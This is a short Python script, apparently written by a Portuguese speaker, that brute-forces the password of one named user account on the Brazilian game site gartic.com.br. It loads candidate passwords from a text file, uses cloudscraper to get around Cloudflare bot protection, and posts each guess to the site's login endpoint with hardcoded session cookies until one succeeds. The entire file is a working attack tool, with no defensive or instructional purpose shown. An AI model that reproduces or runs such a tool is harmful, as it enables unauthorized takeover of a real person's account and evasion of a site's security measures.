import requests
import  cloudscraper
import time

arquivo = open("senhas226.txt")
linhas = arquivo.readlines()
scraper = cloudscraper.create_scraper(  browser={
        'browser': 'firefox',
        'platform': 'windows',
		'mobile': False
    })

url = "https://gartic.com.br/log_ajax.php?rand=1613456323975"

cookies = {
    	'rand':	'1613452048580',
	'__cfduid':	'db804648247ad873966deef4ad79a0df71611319502',
	'aceita':	'600ac8ce2640f',
	'__utma':	'212885122.1023224719.1611319503.1613372920.1613461212.11',
	'__utmz':	'212885122.1611319503.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)',
	'_fbp':	'fb.2.1611319503727.1949961508',
	'aviso_regras':	'ok',
	'desenho':	'961fe1ccvmortu2ve4c6337j46',
	'__utmb':	'212885122.18.10.1613461212',
	'__utmc':	'212885122',
	'__utmt':	'1',
	'FCCDCF'	:'[["AKsRol8-zD9n0KuxsOkzTOv0sTUyr9zHgpybnWSXnKRoojS005EjoCEtjmJYKZk8tAQ77UlwZWthKsCWDbYxyrrsLTRibRWv4dxWulpznWAXcKld03VsWeGq7iO9YQe7W5VXtDDUYCsE_dA9m4JGJLGy_zjYpsxyHA=="],null,["[[],[],[],[],null,null,true]",1613462837031],null]'
}

i = 1
cont =  False

for linha in linhas:
	
    dados = {"userLogin" : "_CORACAOGELADO_", "senhaLogin": linha.split("\n")[0]}


    r = scraper.post("https://gartic.com.br/log_ajax.php", data=dados)
	
    if("erro" in r.text):
        print(i,"senha errada: ", linha.split("\n")[0])
        print(r.text, "\n")
        i = i+1


    else:
        print(i,"senha certa: ", linha.split("\n")[0])
        print(r.text,"\n")
        cont = True
    time.sleep(3)

    if( cont == True ):
        break
		
	

	
arquivo.close()